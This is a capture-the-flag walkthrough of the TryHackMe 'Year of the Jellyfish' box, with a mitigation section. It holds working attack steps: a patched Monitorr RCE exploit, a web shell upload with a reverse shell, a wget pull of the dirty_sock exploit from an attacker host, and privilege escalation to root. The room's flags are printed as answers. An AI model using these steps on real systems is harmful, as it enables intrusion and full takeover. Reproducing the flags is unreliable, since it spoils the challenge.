# Year of the Jellyfish CTF Walkthrough

**Target:** Year of the Jellyfish
**Source:** [TryHackMe](https://tryhackme.com/room/yearofthejellyfish)
**Difficulty:** Hard
**Objective:** Get the flags (Flag 1 and Root Flag)
**Target IP:** 10.81.118.221


## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Virtual Host Discovery](#virtual-host-discovery)
- [Monitorr RCE — Troubleshooting a Public Exploit](#monitorr-rce--troubleshooting-a-public-exploit)
- [Foothold & Flag #1](#foothold--flag-1)
- [Privilege Escalation Research — dirty_sock v1 (Not Pursued)](#privilege-escalation-research--dirty_sock-v1-not-pursued)
- [Privilege Escalation via dirty_sock v2 (CVE-2019-7304)](#privilege-escalation-via-dirty_sock-v2-cve-2019-7304)
- [Room Answers](#room-answers)
- [Vulnerabilities](#vulnerabilities)
- [Attack Chain Summary](#attack-chain-summary)
- [Tools Used](#tools-used)
- [References](#references)

---

## Overview

Year of the Jellyfish is a hard-difficulty Linux box with a deliberately
noisy port spread — FTP, SSH on two separate ports, HTTP, HTTPS, and a
couple of unusual high ports — all sitting behind a single pet-shop
website. The real surface area only shows up once the HTTPS certificate's
Subject Alternative Names are checked: three extra virtual hosts, only
one of which (`monitorr`) actually goes anywhere, running a monitoring
dashboard vulnerable to an unauthenticated RCE. Getting that public
exploit to actually work takes some troubleshooting of its own — the
stock script silently fails against the box's self-signed certificate
and, even after that's fixed, needs an extra authorization-bypass cookie
patched in before the upload genuinely lands. From a `www-data` foothold,
privilege escalation comes down to spotting an outdated `snapd` package
and running the `dirty_sock` exploit (CVE-2019-7304) to mint a
fully-privileged local account.

**Key Skills Required:**
- Service enumeration (`nmap`)
- SSL certificate inspection for virtual host discovery
- Exploit troubleshooting and source-reading (fixing a public PoC rather
  than discarding it)
- Web shell upload and reverse shell handling
- Linux privilege-escalation research via package version auditing
  (`dpkg.log`, `apt list --upgradeable`)
- `dirty_sock` / snapd API abuse (CVE-2019-7304)

---

## Reconnaissance

### Network Scanning

```bash
nmap -sVC -O -p- 10.81.118.221
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 21/tcp | ftp | vsftpd 3.0.3 |
| 22/tcp | ssh | OpenSSH 5.9p1 Debian 5ubuntu1.4 |
| 80/tcp | http | Apache httpd 2.4.29 (redirects to HTTPS) |
| 443/tcp | ssl/http | Apache httpd 2.4.29 — `Robyn's Pet Shop` |
| 8000/tcp | http-alt | "Under Development!" |
| 8096/tcp | http | Microsoft Kestrel httpd (redirects to `/web/index.html`) |
| 22222/tcp | ssh | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |

Two separate SSH services on different ports and a Kestrel-served
redirect both stand out as worth remembering for later, but the
certificate on port 443 is the immediate lead.

### Certificate Inspection

```bash
openssl s_client -connect 10.81.118.221:443 </dev/null 2>/dev/null \
  | openssl x509 -noout -subject -issuer -dates -ext subjectAltName
```

```
subject=C=GB, ST=South West, L=Bristol, O=Robyns Petshop, CN=robyns-petshop.thm, emailAddress=robyn@robyns-petshop.thm
X509v3 Subject Alternative Name:
    DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm
```

The self-signed certificate's SAN field hands over three additional
virtual hosts in one request — no brute forcing required. All four are
added to `/etc/hosts`:

```bash
echo "10.81.118.221 robyns-petshop.thm monitorr.robyns-petshop.thm beta.robyns-petshop.thm dev.robyns-petshop.thm" \
  | sudo tee -a /etc/hosts
```

---

## Virtual Host Discovery

Each discovered hostname is checked in turn:

- **`dev.robyns-petshop.thm`** — looked like the most promising lead for
  leaked administrative credentials, but it simply redirects to the main
  website. Dead end.
- **`beta.robyns-petshop.thm`** — serves the same "Under Construction"
  page seen on port 8000, and hints at an ID-based access pattern:
  ```
  If you have been given a specific ID to use when accessing this
  development site, please put it at the end of the url
  (e.g. beta.robyns-petshop.thm/ID_HERE)
  ```
  No ID was ever obtained elsewhere in the box, so this path wasn't
  pursued further.
- **`monitorr.robyns-petshop.thm`** — loads a real application: Monitorr,
  a self-hosted service-monitoring dashboard. Its settings page discloses
  local filesystem paths directly:
  ```
  User database dir: /var/www/monitorr/data
  User database file: /var/www/monitorr/datausers.db
  ```

Monitorr is the one virtual host worth weaponizing.

```bash
searchsploit monitorr
```

```
Monitorr 1.7.6m - Authorization Bypass                    | php/webapps/48981.py
Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)  | php/webapps/48980.py
```

The unauthenticated RCE is the more direct of the two and is copied
locally for use:

```bash
searchsploit -m 48980.py
```

---

## Monitorr RCE — Troubleshooting a Public Exploit

Running the downloaded exploit as-is fails immediately:

```bash
python 48980.py https://monitorr.robyns-petshop.thm 192.168.131.60 9013
```

```
ssl.SSLCertVerificationError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate
```

The site's self-signed certificate trips Python's default TLS
verification before the request is even sent. A quick file-format check
also turns up a second, unrelated problem — the script has DOS-style line
endings:

```bash
dos2unix 48980.py
```

With both issues apparently addressed, the exploit is run again — several
times — with a listener waiting:

```bash
rlwrap nc -nvlp 443
python 48980.py https://monitorr.robyns-petshop.thm 192.168.131.60 9013
```

```
A shell script should be uploaded. Now we try to execute it
```

The script prints its success message every time, but the listener never
catches a connection. Reading through the exploit's source line by line
reveals the problem: the upload request doesn't include a cookie
(`isHuman`) that the application's authorization-bypass logic checks for
— without it, the "upload" silently fails server-side even though the
script reports success regardless. A corrected copy is saved as
`48980-1.py` with the missing cookie added to the upload request:

```python
r = sess.post(url, headers=headers, data=data, cookies={"isHuman": "1"})
```

Run against the target, the fixed version works immediately:

```bash
python 48980-1.py https://monitorr.robyns-petshop.thm/ 192.168.131.60 443
```

```
<div id='uploadreturn'>File she_ll113.jpg.phtml is an image: <br>
<div id='uploadok'>File she_ll113.jpg.phtml has been uploaded to: ../data/usrimg/she_ll113.jpg.phtml</div></div>
A shell script should be uploaded. Now we try to execute it
```

```bash
rlwrap nc -nvlp 443
```

```
connect to [192.168.131.60] from (UNKNOWN) [10.81.118.221] 50792
www-data@petshop:/var/www/monitorr/assets/data/usrimg$ whoami
www-data
```

> **Foothold:** `www-data`

---

## Foothold & Flag #1

A proper TTY is set up:

```bash
export TERM=xterm
```

The `/var/www` directory is checked directly:

```bash
www-data@petshop:/var/www$ ls -la
```

```
-r-------- 1 www-data www-data   38 Apr 30  2021 flag1.txt
drwxr-xr-x  9 root     root     4096 Apr 11  2021 dev
drwxr-xr-x  9 root     root     4096 Apr 11  2021 html
drwxr-xr-x  4 www-data www-data 4096 Apr 11  2021 monitorr
```

```bash
cat flag1.txt
```

```
THM{MjBkOTMyZDgzNGZmOGI0Y2I5NTljNGNl}
```

> **Flag #1:** `THM{MjBkOTMyZDgzNGZmOGI0Y2I5NTljNGNl}`

`sudo -l` fails without a TTY, and a Python PTY upgrade is applied for
more comfortable interactive work:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

The only other local account, `robyn`, has nothing accessible in its
home directory from `www-data`, so privilege escalation research shifts
to the installed software stack instead.

---

## Privilege Escalation Research — dirty_sock v1 (Not Pursued)

Checking the package upgrade history and currently-upgradeable packages
points straight at an outdated `snapd`:

```bash
cat /var/log/dpkg.log | grep -i upgrade
apt list --upgradeable
```

```
snapd/bionic-updates,bionic-security 2.58+18.04.1 amd64 [upgradable from: 2.32.5+18.04]
```

```bash
searchsploit snapd 2.32
```

```
snapd < 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (1) | linux/local/46361.py
snapd < 2.37 (Ubuntu) - 'dirty_sock' Local Privilege Escalation (2) | linux/local/46362.py
```

Both PoCs for CVE-2019-7304 are copied locally and read before choosing
one:

```bash
searchsploit -m 46361.py 46362.py
```

Version 1 (`46361.py`) requires an Ubuntu SSO account, an uploaded SSH
public key, outbound internet access from the target, and a locally
reachable SSH service — none of which are confirmed available here, so it
is set aside without being attempted. Version 2 (`46362.py`) has no such
prerequisites: it abuses the local snapd API directly to side-load a
malicious "devmode" snap with an install hook that creates a new
sudo-capable user, entirely offline.

---

## Privilege Escalation via dirty_sock v2 (CVE-2019-7304)

The exploit is staged on the attacker machine and pulled onto the target:

```bash
python3 -m http.server --bind=192.168.131.60 80
```

```bash
www-data@petshop:/tmp$ wget http://192.168.131.60:80/46362.py -O 46362.py
chmod +x 46362.py
./46362.py
```

```
[+] Slipped dirty sock on random socket file: /tmp/wpphkpnrnb;uid=0;
[+] Binding to socket file...
[+] Connecting to snapd API...
[+] Deleting trojan snap (and sleeping 5 seconds)...
[+] Installing the trojan snap (and sleeping 8 seconds)...
[+] Deleting trojan snap (and sleeping 5 seconds)...

********************
Success! You can now `su` to the following account and use sudo:
   username: dirty_sock
   password: dirty_sock
********************
```

```bash
www-data@petshop:/tmp$ su dirty_sock
```

```
dirty_sock@petshop:/tmp$ id
uid=1001(dirty_sock) gid=1001(dirty_sock) groups=1001(dirty_sock),27(sudo)
```

The newly-created account is a member of the `sudo` group:

```bash
sudo -s
```

```
root@petshop:/tmp# whoami
root
# cd /root
# cat root.txt
THM{YjMyZTkwYzZhM2U5MGEzZDU2MDc1NTMx}
```

> **Root flag:** `THM{YjMyZTkwYzZhM2U5MGEzZDU2MDc1NTMx}`

---

## Room Answers

| Flag | Value |
|---|---|
| Flag 1 (`/var/www/flag1.txt`) | `THM{MjBkOTMyZDgzNGZmOGI0Y2I5NTljNGNl}` |
| Root flag | `THM{YjMyZTkwYzZhM2U5MGEzZDU2MDc1NTMx}` |

---

## Vulnerabilities

### 1. Virtual Hosts Disclosed via SSL Certificate SAN Field (Low)

**Description:** The HTTPS certificate's Subject Alternative Name field
listed three additional internal hostnames (`monitorr`, `beta`, `dev`)
alongside the main production domain.

**Impact:** Removed the need for virtual host brute forcing entirely —
every hostname worth checking was handed over in a single TLS handshake.

**Mitigation:**
- Issue separate, minimal certificates per externally-facing hostname
  rather than one certificate covering every internal subdomain.
- Treat SAN entries as public information and avoid naming
  development/staging/monitoring hosts in a production certificate.

### 2. Unauthenticated Remote Code Execution in Monitorr 1.7.6m (Critical)

**Description:** Monitorr 1.7.6m is vulnerable to an unauthenticated
arbitrary file upload leading to RCE: a crafted multipart upload with a
`.phtml` extension and an authorization-bypass cookie (`isHuman=1`)
allows a PHP web shell to be written directly into a web-accessible
directory.

**Impact:** Full remote code execution as the web server user
(`www-data`) with no credentials required.

**Mitigation:**
- Upgrade or replace Monitorr — the project is unmaintained and has no
  fixed release for this issue; migrate to an actively maintained
  monitoring tool.
- Prevent PHP execution in any directory intended for file uploads.
- Never trust client-supplied cookies as an authorization mechanism.

### 3. Self-Signed Certificate Masking Exploit Failures (Informational)

**Description:** Not a vulnerability in the target, but worth noting for
methodology: the self-signed certificate on the Monitorr vhost caused the
first exploitation attempt to fail with a TLS verification error rather
than a clean connection — a reminder that infrastructure quirks (lab
self-signed certs, line-ending mismatches) can mask or mimic a "the
exploit doesn't work" dead end when the target is, in fact, vulnerable.

**Mitigation:** N/A for the target. For the tester: always read exploit
source before discarding it as non-functional, and rule out
environmental causes (TLS verification, file encoding, missing
parameters) before concluding a public PoC doesn't apply.

### 4. Outdated snapd Vulnerable to dirty_sock (CVE-2019-7304) (Critical)

**Description:** The installed `snapd` version (2.32.5) predates 2.37 and
is vulnerable to the `dirty_sock` privilege-escalation chain, which abuses
an authorization flaw in snapd's local Unix socket API to install a
malicious snap or create an unauthorized local account.

**Impact:** Full local privilege escalation from `www-data` to a
sudo-capable account, and from there to root.

**Mitigation:**
- Upgrade `snapd` to 2.37.1 or later.
- Apply routine OS and package patching rather than letting security
  updates (visible in `apt list --upgradeable`) accumulate unapplied.
- Restrict local socket permissions for services that expose a
  privileged control API.

---

## Attack Chain Summary

```
Nmap scan → FTP, dual SSH, HTTP/HTTPS, two unusual high ports
    ↓
openssl s_client → certificate SAN → monitorr/beta/dev vhosts discovered
    ↓
dev.thm → dead end (redirects home)
beta.thm → ID-gated "under construction" page → no ID available (not pursued)
    ↓
monitorr.thm → Monitorr dashboard → searchsploit → unauthenticated RCE (48980.py)
    ↓
First run → SSL verification error → dos2unix fixes encoding, not the real issue
    ↓
Source review → missing isHuman authorization-bypass cookie → patched as 48980-1.py
    ↓
Patched exploit → PHP shell uploaded and triggered → foothold: www-data
    ↓
/var/www/flag1.txt → Flag #1
    ↓
dpkg.log / apt list --upgradeable → outdated snapd (CVE-2019-7304)
    ↓
dirty_sock v1 (SSH/SSO prerequisites) → set aside, unmet prerequisites
    ↓
dirty_sock v2 → trojan snap installs dirty_sock:dirty_sock (sudo group)
    ↓
su dirty_sock → sudo -s → root → root.txt
    ↓
Room complete
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service/OS detection |
| OpenSSL (`s_client`) | Certificate inspection and virtual host discovery |
| Searchsploit | Public exploit lookup (Monitorr, snapd) |
| dos2unix | Fixing line-ending issues in a downloaded exploit script |
| Python (modified PoC) | Exploiting the Monitorr unauthenticated RCE |
| netcat (nc) / rlwrap | Reverse shell listener |
| Python HTTP server / wget | Staging exploit files on the target |
| dirty_sock v2 (46362.py) | snapd API abuse for local privilege escalation |

---

## References

- [TryHackMe — Year of the Jellyfish](https://tryhackme.com/room/yearofthejellyfish)
- [Monitorr 1.7.6m RCE — Exploit-DB 48980](https://www.exploit-db.com/exploits/48980)
- [Monitorr 1.7.6m Authorization Bypass — Exploit-DB 48981](https://www.exploit-db.com/exploits/48981)
- [dirty_sock (GitHub)](https://github.com/initstring/dirty_sock)
- [CVE-2019-7304 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2019-7304)

---
